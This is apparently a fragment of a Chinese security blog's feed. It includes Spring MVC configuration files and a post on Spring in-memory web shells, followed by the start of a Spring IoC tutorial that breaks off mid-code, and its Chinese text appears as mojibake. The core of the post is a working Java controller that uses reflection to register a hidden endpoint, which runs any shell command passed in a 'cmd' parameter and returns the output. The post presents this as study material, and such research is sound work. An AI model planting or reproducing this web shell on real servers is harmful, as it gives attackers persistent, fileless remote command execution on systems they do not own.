class="hljs-tag">http://www.springframework.org/schema/context/spring-context.xsd</span></span><br><span class="hljs-string"><span class="hljs-tag">http://www.springframework.org/schema/aop</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/mvc/spring-aop.xsd</span></span><br><span class="hljs-string"><span class="hljs-tag">http://www.springframework.org/schema/mvc</span></span><br><span class="hljs-string"><span class="hljs-tag">http://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;xsw6a&quot;</span>/&gt;</span><br><br><span class="hljs-comment">&lt;!--MVCä½¿ç”¨æ³¨è§£é©±åŠ¨--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mvc:annotation-driven</span>/&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>SpringMVC<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>classpath:spring-servlet.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>SpringMVC<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Spring-MVC<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-aspects<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-aspects<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><br>         <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-webmvc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="æµç¨‹ï¼š"><a href="#æµç¨‹ï¼š" class="headerlink" title="æµç¨‹ï¼š"></a>æµç¨‹ï¼š</h2><p><a href="https://landgrey.me/blog/12/">è¯¦ç»†</a></p><p><a href="https://su18.org/post/memory-shell/#spring-controller-%E5%86%85%E5%AD%98%E9%A9%AC">su18</a></p><p>æ€»çš„æ¥è¯´å°±æ˜¯éœ€è¦åŠ¨æ€æ³¨å†Œï¼Œåœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œå‘ç°åªéœ€è¦åå°„æ§åˆ¶ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204211509691.png" alt="QQæˆªå›¾20220421112836"></p><p>å…¶ä¿¡æ¯å‚¨å­˜å¦‚ä¸‹ï¼š<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204211137206.png" alt="QQæˆªå›¾20220421113712"></p><h2 id="å†…å­˜é©¬"><a href="#å†…å­˜é©¬" class="headerlink" title="å†…å­˜é©¬"></a>å†…å­˜é©¬</h2><p>è¿™é‡Œæˆ‘å°è¯•äº†ç½‘ä¸Šçš„è·å–Contextï¼ŒæˆåŠŸäº†ä¸¤ç§ã€‚å…¶ä»–çš„æœ‰è¿”å›å€¼ä¸ºNULLçš„ï¼Œä¹Ÿæœ‰æ²¡æœ‰åŒ…çš„~~</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.ContextLoader;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.context.support.WebApplicationContextUtils;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.support.RequestContextUtils;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectEvilController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/inject&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">inject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;memls&quot;</span>;<br>      <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//      WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span><br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> InjectedController.class.getMethod(<span class="hljs-string">&quot;cmd&quot;</span>);<br><br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(path);<br>        <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, condition, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">InjectedController</span> <span class="hljs-variable">injectedController</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InjectedController</span>();<br><br><br>        <span class="hljs-comment">// è·å–çˆ¶ç±»çš„ MappingRegistry å±æ€§</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> mapping.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;mappingRegistry&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">mappingRegistry</span> <span class="hljs-operator">=</span> f.get(mapping);<br><br>        <span class="hljs-comment">// åå°„è°ƒç”¨ MappingRegistry çš„ register æ–¹æ³•</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry&quot;</span>);<br>        Method[] ms = c.getDeclaredMethods();<br>        <span class="hljs-keyword">for</span> (Method method1 : ms) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;register&quot;</span>.equals(method1.getName())) &#123;<br>                <span class="hljs-comment">// åå°„è°ƒç”¨ MappingRegistry çš„ register æ–¹æ³•æ³¨å†Œ TestController çš„ index</span><br>                method1.setAccessible(<span class="hljs-literal">true</span>);<br>                method1.invoke(mappingRegistry, info, injectedController,method);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Inject done&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@RestController</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectedController</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">InjectedController</span><span class="hljs-params">()</span>&#123;<br>        &#125;<br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">cmd</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br><br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br>            <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">isr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(is, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(isr);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>            String line;<br><br>            <span class="hljs-keyword">while</span> ((line = br.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>                str += line;<br>            &#125;<br>            is.close();<br>            br.close();<br><br>            <span class="hljs-keyword">return</span> str;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204211506400.png" alt="QQæˆªå›¾20220421150604"></p>]]></content>
    
    
    <categories>
      
      <category>å†…å­˜é©¬</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Springå†…å­˜é©¬ï¼šç¬¬ä¸€å¤©</title>
    <link href="/2022/04/19/Spring%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9A%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
    <url>/2022/04/19/Spring%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9A%E7%AC%AC%E4%B8%80%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="Springå†…å­˜é©¬ï¼šç¬¬ä¸€å¤©"><a href="#Springå†…å­˜é©¬ï¼šç¬¬ä¸€å¤©" class="headerlink" title="Springå†…å­˜é©¬ï¼šç¬¬ä¸€å¤©"></a>Springå†…å­˜é©¬ï¼šç¬¬ä¸€å¤©</h1><p><a href="https://www.bilibili.com/video/BV1wi4y1P7Jm">åŸºç¡€å­¦ä¹ </a></p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.2.13.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="IoCå®¹å™¨"><a href="#IoCå®¹å™¨" class="headerlink" title="IoCå®¹å™¨"></a>IoCå®¹å™¨</h2><p>ç®€å•æ¥è¯´IoCå®¹å™¨å°±æ˜¯å¯ä»¥é€šè¿‡Springçš„æ¡†æ¶æ¥è¯»å–é…ç½®æ–‡ä»¶ï¼Œå¹¶ä¸”å®Œæˆå¯¹è±¡åˆ›å»º+å±æ€§çš„èµ‹å€¼ã€‚ï¼ˆå…¶ä¸­ç”¨åˆ°çš„æ–¹æ³•ä¸ºåå°„ã€‚ï¼‰</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-keyword">private</span> String sex;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(Integer age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getSex</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> sex;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSex</span><span class="hljs-params">(String sex)</span> &#123;<br>        <span class="hljs-built_in">this</span>.sex = sex;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, sex=&#x27;&quot;</span> + sex + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ClassPathXmlApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span 